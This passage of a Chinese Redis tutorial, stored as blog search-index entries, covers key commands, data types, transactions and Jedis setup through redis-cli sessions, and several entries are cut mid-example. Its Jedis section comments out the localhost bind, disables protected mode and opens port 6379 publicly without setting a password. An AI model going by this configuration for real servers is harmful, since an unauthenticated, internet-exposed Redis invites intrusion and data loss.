\"myset:__rand_int__\" 127.0.0.1:6379\u003e DBSIZE # size和key个数相关 (integer) 5 keys * ：查看当前数据库中所有的key。 flushdb：清空当前数据库中的键值对。 flushall：清空所有数据库的键值对。 Redis是单线程的，Redis是基于内存操作的。 所以Redis的性能瓶颈不是CPU,而是机器内存和网络带宽。 那么为什么Redis的速度如此快呢，性能这么高呢？QPS达到10W+ Redis为什么单线程还这么快？ 误区1：高性能的服务器一定是多线程的？ 误区2：多线程（CPU上下文会切换！）一定比单线程效率高！ 核心：Redis是将所有的数据放在内存中的，所以说使用单线程去操作效率就是最高的，多线程（CPU上下文会切换：耗时的操作！），对于内存系统来说，如果没有上下文切换效率就是最高的，多次读写都是在一个CPU上的，在内存存储数据情况下，单线程就是最佳的方案。 ","date":"2021-04-06","objectID":"/posts/redis/:2:6","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"三、五大数据类型 Redis是一个开源（BSD许可），内存存储的数据结构服务器，可用作数据库，高速缓存和消息队列代理。它支持字符串、哈希表、列表、集合、有序集合，位图，hyperloglogs等数据类型。内置复制、Lua脚本、LRU收回、事务以及不同级别磁盘持久化功能，同时通过Redis Sentinel提供高可用，通过Redis Cluster提供自动分区。 ","date":"2021-04-06","objectID":"/posts/redis/:3:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Redis-key 在redis中无论什么数据类型，在数据库中都是以key-value形式保存，通过进行对Redis-key的操作，来完成对数据库中数据的操作。 下面学习的命令： exists key：判断键是否存在 del key：删除键值对 move key db：将键值对移动到指定数据库 expire key second：设置键值对的过期时间 type key：查看value的数据类型 127.0.0.1:6379\u003e keys * # 查看当前数据库所有key (empty list or set) 127.0.0.1:6379\u003e set name qinjiang # set key OK 127.0.0.1:6379\u003e set age 20 OK 127.0.0.1:6379\u003e keys * 1) \"age\" 2) \"name\" 127.0.0.1:6379\u003e move age 1 # 将键值对移动到指定数据库 (integer) 1 127.0.0.1:6379\u003e EXISTS age # 判断键是否存在 (integer) 0 # 不存在 127.0.0.1:6379\u003e EXISTS name (integer) 1 # 存在 127.0.0.1:6379\u003e SELECT 1 OK 127.0.0.1:6379[1]\u003e keys * 1) \"age\" 127.0.0.1:6379[1]\u003e del age # 删除键值对 (integer) 1 # 删除个数 127.0.0.1:6379\u003e set age 20 OK 127.0.0.1:6379\u003e EXPIRE age 15 # 设置键值对的过期时间 (integer) 1 # 设置成功 开始计数 127.0.0.1:6379\u003e ttl age # 查看key的过期剩余时间 (integer) 13 127.0.0.1:6379\u003e ttl age (integer) 11 127.0.0.1:6379\u003e ttl age (integer) 9 127.0.0.1:6379\u003e ttl age (integer) -2 # -2 表示key过期，-1表示key未设置过期时间 127.0.0.1:6379\u003e get age # 过期的key 会被自动delete (nil) 127.0.0.1:6379\u003e keys * 1) \"name\" 127.0.0.1:6379\u003e type name # 查看value的数据类型 string 关于TTL命令 Redis的key，通过TTL命令返回key的过期时间，一般来说有3种： 当前key没有设置过期时间，所以会返回-1. 当前key有设置过期时间，而且key已经过期，所以会返回-2. 当前key有设置过期时间，且key还没有过期，故会返回key的正常剩余时间. 关于重命名RENAME和RENAMENX RENAME key newkey修改 key 的名称 RENAMENX key newkey仅当 newkey 不存在时，将 key 改名为 newkey 。 更多命令学习：https://www.redis.net.cn/order/ [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-wBVZtGVm-1597890996517)(狂神说 Redis.assets/image-20200813114228439.png)] ","date":"2021-04-06","objectID":"/posts/redis/:3:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"String(字符串) 普通的set、get直接略过。 命令 描述 示例 APPEND key value 向指定的key的value后追加字符串 127.0.0.1:6379\u003e set msg hello OK 127.0.0.1:6379\u003e append msg \" world\" (integer) 11 127.0.0.1:6379\u003e get msg “hello world” DECR/INCR key 将指定key的value数值进行+1/-1(仅对于数字) 127.0.0.1:6379\u003e set age 20 OK 127.0.0.1:6379\u003e incr age (integer) 21 127.0.0.1:6379\u003e decr age (integer) 20 INCRBY/DECRBY key n 按指定的步长对数值进行加减 127.0.0.1:6379\u003e INCRBY age 5 (integer) 25 127.0.0.1:6379\u003e DECRBY age 10 (integer) 15 INCRBYFLOAT key n 为数值加上浮点型数值 127.0.0.1:6379\u003e INCRBYFLOAT age 5.2 “20.2” STRLEN key 获取key保存值的字符串长度 127.0.0.1:6379\u003e get msg “hello world” 127.0.0.1:6379\u003e STRLEN msg (integer) 11 GETRANGE key start end 按起止位置获取字符串（闭区间，起止位置都取） 127.0.0.1:6379\u003e get msg “hello world” 127.0.0.1:6379\u003e GETRANGE msg 3 9 “lo worl” SETRANGE key offset value 用指定的value 替换key中 offset开始的值 127.0.0.1:6379\u003e SETRANGE msg 2 hello (integer) 7 127.0.0.1:6379\u003e get msg “tehello” GETSET key value 将给定 key 的值设为 value ，并返回 key 的旧值(old value)。 127.0.0.1:6379\u003e GETSET msg test “hello world” SETNX key value 仅当key不存在时进行set 127.0.0.1:6379\u003e SETNX msg test (integer) 0 127.0.0.1:6379\u003e SETNX name sakura (integer) 1 SETEX key seconds value set 键值对并设置过期时间 127.0.0.1:6379\u003e setex name 10 root OK 127.0.0.1:6379\u003e get name (nil) MSET key1 value1 [key2 value2..] 批量set键值对 127.0.0.1:6379\u003e MSET k1 v1 k2 v2 k3 v3 OK MSETNX key1 value1 [key2 value2..] 批量设置键值对，仅当参数中所有的key都不存在时执行 127.0.0.1:6379\u003e MSETNX k1 v1 k4 v4 (integer) 0 MGET key1 [key2..] 批量获取多个key保存的值 127.0.0.1:6379\u003e MGET k1 k2 k3 1) “v1” 2) “v2” 3) “v3” PSETEX key milliseconds value 和 SETEX 命令相似，但它以毫秒为单位设置 key 的生存时间， getset key value 如果不存在值，则返回nil，如果存在值，获取原来的值，并设置新的值 String类似的使用场景：value除了是字符串还可以是数字，用途举例： 计数器 统计多单位的数量：uid:123666：follow 0 粉丝数 对象存储缓存 ","date":"2021-04-06","objectID":"/posts/redis/:3:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"List(列表) Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边） 一个列表最多可以包含 232 - 1 个元素 (4294967295, 每个列表超过40亿个元素)。 首先我们列表，可以经过规则定义将其变为队列、栈、双端队列等 正如图Redis中List是可以进行双端操作的，所以命令也就分为了LXXX和RLLL两类，有时候L也表示List例如LLEN 命令 描述 LPUSH/RPUSH key value1[value2..] 从左边/右边向列表中PUSH值(一个或者多个)。 LRANGE key start end 获取list 起止元素==（索引从左往右 递增）== LPUSHX/RPUSHX key value 向已存在的列名中push值（一个或者多个） `LINSERT key BEFORE AFTER pivot value` LLEN key 查看列表长度 LINDEX key index 通过索引获取列表元素 LSET key index value 通过索引为元素设值 LPOP/RPOP key 从最左边/最右边移除值 并返回 RPOPLPUSH source destination 将列表的尾部(右)最后一个值弹出，并返回，然后加到另一个列表的头部 LTRIM key start end 通过下标截取指定范围内的列表 LREM key count value List中是允许value重复的 count \u003e 0：从头部开始搜索 然后删除指定的value 至多删除count个 count \u003c 0：从尾部开始搜索… count = 0：删除列表中所有的指定value。 BLPOP/BRPOP key1[key2] timout 移出并获取列表的第一个/最后一个元素， 如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。 BRPOPLPUSH source destination timeout 和RPOPLPUSH功能相同，如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。 ---------------------------LPUSH---RPUSH---LRANGE-------------------------------- 127.0.0.1:6379\u003e LPUSH mylist k1 # LPUSH mylist=\u003e{1} (integer) 1 127.0.0.1:6379\u003e LPUSH mylist k2 # LPUSH mylist=\u003e{2,1} (integer) 2 127.0.0.1:6379\u003e RPUSH mylist k3 # RPUSH mylist=\u003e{2,1,3} (integer) 3 127.0.0.1:6379\u003e get mylist # 普通的get是无法获取list值的 (error) WRONGTYPE Operation against a key holding the wrong kind of value 127.0.0.1:6379\u003e LRANGE mylist 0 4 # LRANGE 获取起止位置范围内的元素 1) \"k2\" 2) \"k1\" 3) \"k3\" 127.0.0.1:6379\u003e LRANGE mylist 0 2 1) \"k2\" 2) \"k1\" 3) \"k3\" 127.0.0.1:6379\u003e LRANGE mylist 0 1 1) \"k2\" 2) \"k1\" 127.0.0.1:6379\u003e LRANGE mylist 0 -1 # 获取全部元素 1) \"k2\" 2) \"k1\" 3) \"k3\" ---------------------------LPUSHX---RPUSHX----------------------------------- 127.0.0.1:6379\u003e LPUSHX list v1 # list不存在 LPUSHX失败 (integer) 0 127.0.0.1:6379\u003e LPUSHX list v1 v2 (integer) 0 127.0.0.1:6379\u003e LPUSHX mylist k4 k5 # 向mylist中 左边 PUSH k4 k5 (integer) 5 127.0.0.1:6379\u003e LRANGE mylist 0 -1 1) \"k5\" 2) \"k4\" 3) \"k2\" 4) \"k1\" 5) \"k3\" ---------------------------LINSERT--LLEN--LINDEX--LSET---------------------------- 127.0.0.1:6379\u003e LINSERT myli","date":"2021-04-06","objectID":"/posts/redis/:3:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Set(集合) Redis的Set是string类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。 Redis 中 集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。 集合中最大的成员数为 232 - 1 (4294967295, 每个集合可存储40多亿个成员)。 命令 描述 SADD key member1[member2..] 向集合中无序增加一个/多个成员 SCARD key 获取集合的成员数 SMEMBERS key 返回集合中所有的成员 SISMEMBER key member 查询member元素是否是集合的成员,结果是无序的 SRANDMEMBER key [count] 随机返回集合中count个成员，count缺省值为1 SPOP key [count] 随机移除并返回集合中count个成员，count缺省值为1 SMOVE source destination member 将source集合的成员member移动到destination集合 SREM key member1[member2..] 移除集合中一个/多个成员 SDIFF key1[key2..] 返回所有集合的差集 key1- key2 - … SDIFFSTORE destination key1[key2..] 在SDIFF的基础上，将结果保存到集合中==(覆盖)==。不能保存到其他类型key噢！ SINTER key1 [key2..] 返回所有集合的交集 SINTERSTORE destination key1[key2..] 在SINTER的基础上，存储结果到集合中。覆盖 SUNION key1 [key2..] 返回所有集合的并集 SUNIONSTORE destination key1 [key2..] 在SUNION的基础上，存储结果到及和张。覆盖 SSCAN KEY [MATCH pattern] [COUNT count] 在大量数据环境下，使用此命令遍历集合中元素，每次遍历部分 ---------------SADD--SCARD--SMEMBERS--SISMEMBER-------------------- 127.0.0.1:6379\u003e SADD myset m1 m2 m3 m4 # 向myset中增加成员 m1~m4 (integer) 4 127.0.0.1:6379\u003e SCARD myset # 获取集合的成员数目 (integer) 4 127.0.0.1:6379\u003e smembers myset # 获取集合中所有成员 1) \"m4\" 2) \"m3\" 3) \"m2\" 4) \"m1\" 127.0.0.1:6379\u003e SISMEMBER myset m5 # 查询m5是否是myset的成员 (integer) 0 # 不是，返回0 127.0.0.1:6379\u003e SISMEMBER myset m2 (integer) 1 # 是，返回1 127.0.0.1:6379\u003e SISMEMBER myset m3 (integer) 1 ---------------------SRANDMEMBER--SPOP---------------------------------- 127.0.0.1:6379\u003e SRANDMEMBER myset 3 # 随机返回3个成员 1) \"m2\" 2) \"m3\" 3) \"m4\" 127.0.0.1:6379\u003e SRANDMEMBER myset # 随机返回1个成员 \"m3\" 127.0.0.1:6379\u003e SPOP myset 2 # 随机移除并返回2个成员 1) \"m1\" 2) \"m4\" # 将set还原到{m1,m2,m3,m4} ---------------------SMOVE--SREM---------------------------------------- 127.0.0.1:6379\u003e SMOVE myset newset m3 # 将myset中m3成员移动到newset集合 (integer) 1 127.0.0.1:6379\u003e SMEMBERS myset 1) \"m4\" 2) \"m2\" 3) \"m1\" 127.0.0.1:6379\u003e SMEMBERS newset 1) \"m3\" 127.0.0.1:6379\u003e SREM newset m3 # 从newset中移除m3元素 (integer) 1 127.0.0.1:6379\u003e SMEMBERS newset (empty list or set) # 下面开始是多集合操作,多集合操作中若只有一个参数默认和自身进行运算 # setx=\u003e{m1,m2,m","date":"2021-04-06","objectID":"/posts/redis/:3:4","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Hash（哈希） Redis hash 是一个string类型的field和value的映射表，hash特别适合用于存储对象。 Set就是一种简化的Hash,只变动key,而value使用默认值填充。可以将一个Hash表作为一个对象进行存储，表中存放对象的信息。 命令 描述 HSET key field value 将哈希表 key 中的字段 field 的值设为 value 。重复设置同一个field会覆盖,返回0 HMSET key field1 value1 [field2 value2..] 同时将多个 field-value (域-值)对设置到哈希表 key 中。 HSETNX key field value 只有在字段 field 不存在时，设置哈希表字段的值。 HEXISTS key field 查看哈希表 key 中，指定的字段是否存在。 HGET key field value 获取存储在哈希表中指定字段的值 HMGET key field1 [field2..] 获取所有给定字段的值 HGETALL key 获取在哈希表key 的所有字段和值 HKEYS key 获取哈希表key中所有的字段 HLEN key 获取哈希表中字段的数量 HVALS key 获取哈希表中所有值 HDEL key field1 [field2..] 删除哈希表key中一个/多个field字段 HINCRBY key field n 为哈希表 key 中的指定字段的整数值加上增量n，并返回增量后结果 一样只适用于整数型字段 HINCRBYFLOAT key field n 为哈希表 key 中的指定字段的浮点数值加上增量 n。 HSCAN key cursor [MATCH pattern] [COUNT count] 迭代哈希表中的键值对。 ------------------------HSET--HMSET--HSETNX---------------- 127.0.0.1:6379\u003e HSET studentx name sakura # 将studentx哈希表作为一个对象，设置name为sakura (integer) 1 127.0.0.1:6379\u003e HSET studentx name gyc # 重复设置field进行覆盖，并返回0 (integer) 0 127.0.0.1:6379\u003e HSET studentx age 20 # 设置studentx的age为20 (integer) 1 127.0.0.1:6379\u003e HMSET studentx sex 1 tel 15623667886 # 设置sex为1，tel为15623667886 OK 127.0.0.1:6379\u003e HSETNX studentx name gyc # HSETNX 设置已存在的field (integer) 0 # 失败 127.0.0.1:6379\u003e HSETNX studentx email 12345@qq.com (integer) 1 # 成功 ----------------------HEXISTS-------------------------------- 127.0.0.1:6379\u003e HEXISTS studentx name # name字段在studentx中是否存在 (integer) 1 # 存在 127.0.0.1:6379\u003e HEXISTS studentx addr (integer) 0 # 不存在 -------------------HGET--HMGET--HGETALL----------- 127.0.0.1:6379\u003e HGET studentx name # 获取studentx中name字段的value \"gyc\" 127.0.0.1:6379\u003e HMGET studentx name age tel # 获取studentx中name、age、tel字段的value 1) \"gyc\" 2) \"20\" 3) \"15623667886\" 127.0.0.1:6379\u003e HGETALL studentx # 获取studentx中所有的field及其value 1) \"name\" 2) \"gyc\" 3) \"age\" 4) \"20\" 5) \"sex\" 6) \"1\" 7) \"tel\" 8) \"15623667886\" 9) \"email\" 10) \"12345@qq.com\" --------------------HKEYS--HLEN--HVALS-------------- 127.0.0.1:6379\u003e HKEYS studentx # 查看studentx中所有的fie","date":"2021-04-06","objectID":"/posts/redis/:3:5","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Zset（有序集合） 不同的是每个元素都会关联一个double类型的分数（score）。redis正是通过分数来为集合中的成员进行从小到大的排序。 score相同：按字典顺序排序 有序集合的成员是唯一的,但分数(score)却可以重复。 命令 描述 ZADD key score member1 [score2 member2] 向有序集合添加一个或多个成员，或者更新已存在成员的分数 ZCARD key 获取有序集合的成员数 ZCOUNT key min max 计算在有序集合中指定区间score的成员数 ZINCRBY key n member 有序集合中对指定成员的分数加上增量 n ZSCORE key member 返回有序集中，成员的分数值 ZRANK key member 返回有序集合中指定成员的索引 ZRANGE key start end 通过索引区间返回有序集合成指定区间内的成员 ZRANGEBYLEX key min max 通过字典区间返回有序集合的成员 ZRANGEBYSCORE key min max 通过分数返回有序集合指定区间内的成员==-inf 和 +inf分别表示最小最大值，只支持开区间()== ZLEXCOUNT key min max 在有序集合中计算指定字典区间内成员数量 ZREM key member1 [member2..] 移除有序集合中一个/多个成员 ZREMRANGEBYLEX key min max 移除有序集合中给定的字典区间的所有成员 ZREMRANGEBYRANK key start stop 移除有序集合中给定的排名区间的所有成员 ZREMRANGEBYSCORE key min max 移除有序集合中给定的分数区间的所有成员 ZREVRANGE key start end 返回有序集中指定区间内的成员，通过索引，分数从高到底 ZREVRANGEBYSCORRE key max min 返回有序集中指定分数区间内的成员，分数从高到低排序 ZREVRANGEBYLEX key max min 返回有序集中指定字典区间内的成员，按字典顺序倒序 ZREVRANK key member 返回有序集合中指定成员的排名，有序集成员按分数值递减(从大到小)排序 ZINTERSTORE destination numkeys key1 [key2 ..] 计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 key 中，numkeys：表示参与运算的集合数，将score相加作为结果的score ZUNIONSTORE destination numkeys key1 [key2..] 计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 key 中 ZSCAN key cursor [MATCH pattern\\] [COUNT count] 迭代有序集合中的元素（包括元素成员和元素分值） -------------------ZADD--ZCARD--ZCOUNT-------------- 127.0.0.1:6379\u003e ZADD myzset 1 m1 2 m2 3 m3 # 向有序集合myzset中添加成员m1 score=1 以及成员m2 score=2.. (integer) 2 127.0.0.1:6379\u003e ZCARD myzset # 获取有序集合的成员数 (integer) 2 127.0.0.1:6379\u003e ZCOUNT myzset 0 1 # 获取score在 [0,1]区间的成员数量 (integer) 1 127.0.0.1:6379\u003e ZCOUNT myzset 0 2 (integer) 2 ----------------ZINCRBY--ZSCORE-------------------------- 127.0.0.1:6379\u003e ZINCRBY myzset 5 m2 # 将成员m2的score +5 \"7\" 127.0.0.1:6379\u003e ZSCORE myzset m1 # 获取成员m1的score \"1\" 127.0.0.1:6379\u003e ZSCORE myzset m2 \"7\" --------------ZRANK--ZRANGE----------------------------------- 127.0.0.1:6379\u003e ZRANK myzset m1 # 获取成员m1的索引，索引按照score排序，score相同索引值按字典顺序顺序增加 (integer) 0 127.0.0.1:6379\u003e ZRANK myzset m2 (integer) 2 127.0.0.1:6379\u003e ZRANGE myzset 0 ","date":"2021-04-06","objectID":"/posts/redis/:3:6","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"四、三种特殊数据类型 ","date":"2021-04-06","objectID":"/posts/redis/:4:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Geospatial(地理位置) 使用经纬度定位地理坐标并用一个有序集合zset保存，所以zset命令也可以使用 命令 描述 geoadd key longitud(经度) latitude(纬度) member [..] 将具体经纬度的坐标存入一个有序集合 geopos key member [member..] 获取集合中的一个/多个成员坐标 geodist key member1 member2 [unit] 返回两个给定位置之间的距离。默认以米作为单位。 `georadius key longitude latitude radius m km GEORADIUSBYMEMBER key member radius... 功能与GEORADIUS相同，只是中心位置不是具体的经纬度，而是使用结合中已有的成员作为中心点。 geohash key member1 [member2..] 返回一个或多个位置元素的Geohash表示。使用Geohash位置52点整数编码。 有效经纬度 有效的经度从-180度到180度。 有效的纬度从-85.05112878度到85.05112878度。 指定单位的参数 unit 必须是以下单位的其中一个： m 表示单位为米。 km 表示单位为千米。 mi 表示单位为英里。 ft 表示单位为英尺。 关于GEORADIUS的参数 通过georadius就可以完成 附近的人功能 withcoord:带上坐标 withdist:带上距离，单位与半径单位相同 COUNT n : 只显示前n个(按距离递增排序) ----------------georadius--------------------- 127.0.0.1:6379\u003e GEORADIUS china:city 120 30 500 km withcoord withdist # 查询经纬度(120,30)坐标500km半径内的成员 1) 1) \"hangzhou\" 2) \"29.4151\" 3) 1) \"120.20000249147415\" 2) \"30.199999888333501\" 2) 1) \"shanghai\" 2) \"205.3611\" 3) 1) \"121.40000134706497\" 2) \"31.400000253193539\" ------------geohash--------------------------- 127.0.0.1:6379\u003e geohash china:city yichang shanghai # 获取成员经纬坐标的geohash表示 1) \"wmrjwbr5250\" 2) \"wtw6ds0y300\" ","date":"2021-04-06","objectID":"/posts/redis/:4:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Hyperloglog(基数统计) Redis HyperLogLog 是用来做基数统计的算法，HyperLogLog 的优点是，在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的、并且是很小的。 花费 12 KB 内存，就可以计算接近 2^64 个不同元素的基数。 因为 HyperLogLog 只会根据输入元素来计算基数，而不会储存输入元素本身，所以 HyperLogLog 不能像集合那样，返回输入的各个元素。 其底层使用string数据类型 什么是基数？ 数据集中不重复的元素的个数。 应用场景： 网页的访问量（UV）：一个用户多次访问，也只能算作一个人。 传统实现，存储用户的id,然后每次进行比较。当用户变多之后这种方式及其浪费空间，而我们的目的只是计数，Hyperloglog就能帮助我们利用最小的空间完成。 命令 描述 PFADD key element1 [elememt2..] 添加指定元素到 HyperLogLog 中 PFCOUNT key [key] 返回给定 HyperLogLog 的基数估算值。 PFMERGE destkey sourcekey [sourcekey..] 将多个 HyperLogLog 合并为一个 HyperLogLog ----------PFADD--PFCOUNT--------------------- 127.0.0.1:6379\u003e PFADD myelemx a b c d e f g h i j k # 添加元素 (integer) 1 127.0.0.1:6379\u003e type myelemx # hyperloglog底层使用String string 127.0.0.1:6379\u003e PFCOUNT myelemx # 估算myelemx的基数 (integer) 11 127.0.0.1:6379\u003e PFADD myelemy i j k z m c b v p q s (integer) 1 127.0.0.1:6379\u003e PFCOUNT myelemy (integer) 11 ----------------PFMERGE----------------------- 127.0.0.1:6379\u003e PFMERGE myelemz myelemx myelemy # 合并myelemx和myelemy 成为myelemz OK 127.0.0.1:6379\u003e PFCOUNT myelemz # 估算基数 (integer) 17 如果允许容错，那么一定可以使用Hyperloglog ! 如果不允许容错，就使用set或者自己的数据类型即可 ！ ","date":"2021-04-06","objectID":"/posts/redis/:4:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"BitMaps(位图) 使用位存储，信息状态只有 0 和 1 Bitmap是一串连续的2进制数字（0或1），每一位所在的位置为偏移(offset)，在bitmap上可执行AND,OR,XOR,NOT以及其它位操作。 应用场景 签到统计、状态统计 命令 描述 setbit key offset value 为指定key的offset位设置值 getbit key offset 获取offset位的值 bitcount key [start end] 统计字符串被设置为1的bit数，也可以指定统计范围按字节 bitop operration destkey key[key..] 对一个或多个保存二进制位的字符串 key 进行位元操作，并将结果保存到 destkey 上。 BITPOS key bit [start] [end] 返回字符串里面第一个被设置为1或者0的bit位。start和end只能按字节,不能按位 ------------setbit--getbit-------------- 127.0.0.1:6379\u003e setbit sign 0 1 # 设置sign的第0位为 1 (integer) 0 127.0.0.1:6379\u003e setbit sign 2 1 # 设置sign的第2位为 1 不设置默认 是0 (integer) 0 127.0.0.1:6379\u003e setbit sign 3 1 (integer) 0 127.0.0.1:6379\u003e setbit sign 5 1 (integer) 0 127.0.0.1:6379\u003e type sign string 127.0.0.1:6379\u003e getbit sign 2 # 获取第2位的数值 (integer) 1 127.0.0.1:6379\u003e getbit sign 3 (integer) 1 127.0.0.1:6379\u003e getbit sign 4 # 未设置默认是0 (integer) 0 -----------bitcount---------------------------- 127.0.0.1:6379\u003e BITCOUNT sign # 统计sign中为1的位数 (integer) 4 bitmaps的底层 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-9PlszjhS-1597890996519)(D:\\我\\MyBlog\\狂神说 Redis.assets\\image-20200803234336175.png)] 这样设置以后你能get到的值是：\\xA2\\x80，所以bitmaps是一串从左到右的二进制串 ","date":"2021-04-06","objectID":"/posts/redis/:4:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"五、事务 Redis的单条命令是保证原子性的，但是redis事务不能保证原子性 Redis事务本质：一组命令的集合。 —————– 队列 set set set 执行 ——————- 事务中每条命令都会被序列化，执行过程中按顺序执行，不允许其他命令进行干扰。 一次性 顺序性 排他性 Redis事务没有隔离级别的概念 Redis单条命令是保证原子性的，但是事务不保证原子性！ ","date":"2021-04-06","objectID":"/posts/redis/:5:0","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"Redis事务操作过程 开启事务（multi） 命令入队 执行事务（exec） 所以事务中的命令在加入时都没有被执行，直到提交时才会开始执行(Exec)一次性完成。 127.0.0.1:6379\u003e multi # 开启事务 OK 127.0.0.1:6379\u003e set k1 v1 # 命令入队 QUEUED 127.0.0.1:6379\u003e set k2 v2 # .. QUEUED 127.0.0.1:6379\u003e get k1 QUEUED 127.0.0.1:6379\u003e set k3 v3 QUEUED 127.0.0.1:6379\u003e keys * QUEUED 127.0.0.1:6379\u003e exec # 事务执行 1) OK 2) OK 3) \"v1\" 4) OK 5) 1) \"k3\" 2) \"k2\" 3) \"k1\" 取消事务(discurd) 127.0.0.1:6379\u003e multi OK 127.0.0.1:6379\u003e set k1 v1 QUEUED 127.0.0.1:6379\u003e set k2 v2 QUEUED 127.0.0.1:6379\u003e DISCARD # 放弃事务 OK 127.0.0.1:6379\u003e EXEC (error) ERR EXEC without MULTI # 当前未开启事务 127.0.0.1:6379\u003e get k1 # 被放弃事务中命令并未执行 (nil) ","date":"2021-04-06","objectID":"/posts/redis/:5:1","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"事务错误 代码语法错误（编译时异常）所有的命令都不执行 127.0.0.1:6379\u003e multi OK 127.0.0.1:6379\u003e set k1 v1 QUEUED 127.0.0.1:6379\u003e set k2 v2 QUEUED 127.0.0.1:6379\u003e error k1 # 这是一条语法错误命令 (error) ERR unknown command `error`, with args beginning with: `k1`, # 会报错但是不影响后续命令入队 127.0.0.1:6379\u003e get k2 QUEUED 127.0.0.1:6379\u003e EXEC (error) EXECABORT Transaction discarded because of previous errors. # 执行报错 127.0.0.1:6379\u003e get k1 (nil) # 其他命令并没有被执行 代码逻辑错误 (运行时异常) **其他命令可以正常执行 ** »\u003e 所以不保证事务原子性 127.0.0.1:6379\u003e multi OK 127.0.0.1:6379\u003e set k1 v1 QUEUED 127.0.0.1:6379\u003e set k2 v2 QUEUED 127.0.0.1:6379\u003e INCR k1 # 这条命令逻辑错误（对字符串进行增量） QUEUED 127.0.0.1:6379\u003e get k2 QUEUED 127.0.0.1:6379\u003e exec 1) OK 2) OK 3) (error) ERR value is not an integer or out of range # 运行时报错 4) \"v2\" # 其他命令正常执行 # 虽然中间有一条命令报错了，但是后面的指令依旧正常执行成功了。 # 所以说Redis单条指令保证原子性，但是Redis事务不能保证原子性。 ","date":"2021-04-06","objectID":"/posts/redis/:5:2","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"监控 悲观锁： 很悲观，认为什么时候都会出现问题，无论做什么都会加锁 乐观锁： 很乐观，认为什么时候都不会出现问题，所以不会上锁！更新数据的时候去判断一下，在此期间是否有人修改过这个数据 获取version 更新的时候比较version 使用watch key监控指定数据，相当于乐观锁加锁。 正常执行 127.0.0.1:6379\u003e set money 100 # 设置余额:100 OK 127.0.0.1:6379\u003e set use 0 # 支出使用:0 OK 127.0.0.1:6379\u003e watch money # 监视money (上锁) OK 127.0.0.1:6379\u003e multi OK 127.0.0.1:6379\u003e DECRBY money 20 QUEUED 127.0.0.1:6379\u003e INCRBY use 20 QUEUED 127.0.0.1:6379\u003e exec # 监视值没有被中途修改，事务正常执行 1) (integer) 80 2) (integer) 20 测试多线程修改值，使用watch可以当做redis的乐观锁操作（相当于getversion） 我们启动另外一个客户端模拟插队线程。 线程1： 127.0.0.1:6379\u003e watch money # money上锁 OK 127.0.0.1:6379\u003e multi OK 127.0.0.1:6379\u003e DECRBY money 20 QUEUED 127.0.0.1:6379\u003e INCRBY use 20 QUEUED 127.0.0.1:6379\u003e # 此时事务并没有执行 模拟线程插队，线程2： 127.0.0.1:6379\u003e INCRBY money 500 # 修改了线程一中监视的money (integer) 600 12 回到线程1，执行事务： 127.0.0.1:6379\u003e EXEC # 执行之前，另一个线程修改了我们的值，这个时候就会导致事务执行失败 (nil) # 没有结果，说明事务执行失败 127.0.0.1:6379\u003e get money # 线程2 修改生效 \"600\" 127.0.0.1:6379\u003e get use # 线程1事务执行失败，数值没有被修改 \"0\" 解锁获取最新值，然后再加锁进行事务。 unwatch进行解锁。 注意：每次提交执行exec后都会自动释放锁，不管是否成功 ","date":"2021-04-06","objectID":"/posts/redis/:5:3","tags":["Redis"],"title":"Redis","uri":"/posts/redis/"},{"categories":["数据库"],"content":"六、Jedis 使用Java来操作Redis，Jedis是Redis官方推荐使用的Java连接redis的客户端。 导入依赖 \u003c!--导入jredis的包--\u003e \u003cdependency\u003e \u003cgroupId\u003eredis.clients\u003c/groupId\u003e \u003cartifactId\u003ejedis\u003c/artifactId\u003e \u003cversion\u003e3.2.0\u003c/version\u003e \u003c/dependency\u003e \u003c!--fastjson--\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e \u003cartifactId\u003efastjson\u003c/artifactId\u003e \u003cversion\u003e1.2.70\u003c/version\u003e \u003c/dependency\u003e 编码测试 连接数据库 修改redis的配置文件 vim /usr/local/bin/myconfig/redis.conf 1 将只绑定本地注释 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-4IRUFJ95-1597890996520)(狂神说 Redis.assets/image-20200813161921480.png)] 保护模式改为 no [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-oKjIVapw-1597890996521)(狂神说 Redis.assets/image-20200813161939847.png)] 允许后台运行 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-c2IMvpZL-1597890996522)(狂神说 Redis.assets/image-20200813161954567.png)] 开放端口6379 firewall-cmd --zone=public --add-port=6379/tcp --permanet 1 重启防火墙服务 systemctl restart firewalld.service 1 阿里云服务器控制台配置安全组 重启redis-server [root@AlibabaECS bin]# redis-server myconfig/redis.conf 1 操作命令 